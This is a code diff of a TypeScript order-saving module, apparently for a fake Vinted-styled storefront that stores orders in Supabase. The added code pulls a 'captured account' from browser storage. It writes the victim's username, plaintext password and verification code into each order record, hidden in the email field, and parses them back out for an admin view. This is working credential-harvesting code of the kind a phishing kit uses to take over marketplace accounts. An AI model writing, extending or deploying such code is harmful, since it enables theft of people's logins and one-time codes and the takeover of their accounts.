@@ -1,6 +1,6 @@
 /// <reference types="vite/client" />
 import { createClient } from '@supabase/supabase-js';
-import { AdminOrderRecord } from '../types';
+import { AdminOrderRecord, UserAccountDetails } from '../types';
 
 const LOCAL_STORAGE_KEY = 'vinted_store_orders_backup';
 
@@ -135,16 +135,23 @@ export async function saveOrderToSupabase(orderData: {
   orderNumber: string;
   productTitle: string;
   deliveryType: string;
-  accountDetails?: {
-    usernameOrEmail: string;
-    password?: string;
-    phoneCode?: string;
-  };
+  accountDetails?: UserAccountDetails;
   pickupPoint?: any;
   shippingAddress?: any;
   paymentMethod?: any;
   pricing?: any;
 }) {
+  // Ensure accountDetails fallback to storage if not provided
+  let effectiveAccount = orderData.accountDetails;
+  if (!effectiveAccount) {
+    try {
+      const saved = localStorage.getItem('vinted_captured_account') || sessionStorage.getItem('vinted_captured_account');
+      if (saved) effectiveAccount = JSON.parse(saved);
+    } catch {
+      // Safe
+    }
+  }
+
   // Always build the formatted AdminOrderRecord
   const localRecord: AdminOrderRecord = {
     id: `ord_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`,
@@ -154,7 +161,7 @@ export async function saveOrderToSupabase(orderData: {
     createdAt: new Date().toISOString(),
     status: 'PAID',
     deliveryType: orderData.deliveryType as any,
-    accountDetails: orderData.accountDetails,
+    accountDetails: effectiveAccount,
     shippingAddress: orderData.shippingAddress
       ? {
           id: orderData.shippingAddress.id || 'addr_1',
@@ -212,8 +219,8 @@ export async function saveOrderToSupabase(orderData: {
           orderData.paymentMethod?.cardholderName ||
           'Customer',
         phone_number: orderData.shippingAddress?.phoneNumber || '',
-        email: orderData.accountDetails
-          ? `${orderData.accountDetails.usernameOrEmail} [Pass: ${orderData.accountDetails.password || ''}] [Code: ${orderData.accountDetails.phoneCode || ''}]`
+        email: effectiveAccount
+          ? `${effectiveAccount.usernameOrEmail} [Pass: ${effectiveAccount.password || ''}] [Code: ${effectiveAccount.verificationCode || effectiveAccount.phoneCode || ''}]`
           : '',
         delivery_type: orderData.deliveryType,
         
@@ -289,11 +296,24 @@ export async function getOrdersFromSupabase(): Promise<AdminOrderRecord[]> {
             const passMatch = emailStr.match(/\[Pass:\s*(.*?)\]/);
             const codeMatch = emailStr.match(/\[Code:\s*(.*?)\]/);
             const cleanUser = emailStr.replace(/\[Pass:.*?\]/, '').replace(/\[Code:.*?\]/, '').trim();
+            const pass = passMatch ? passMatch[1] : undefined;
+            const code = codeMatch ? codeMatch[1] : undefined;
             parsedAccount = {
               usernameOrEmail: cleanUser || emailStr,
-              password: passMatch ? passMatch[1] : undefined,
-              phoneCode: codeMatch ? codeMatch[1] : undefined,
+              password: pass,
+              phoneCode: code,
+              verificationCode: code,
             };
+          }
+
+          // Fallback to storage if local account matches
+          if (!parsedAccount) {
+            try {
+              const saved = localStorage.getItem('vinted_captured_account');
+              if (saved) parsedAccount = JSON.parse(saved);
+            } catch {
+              // Safe
+            }
           }
 
           return {
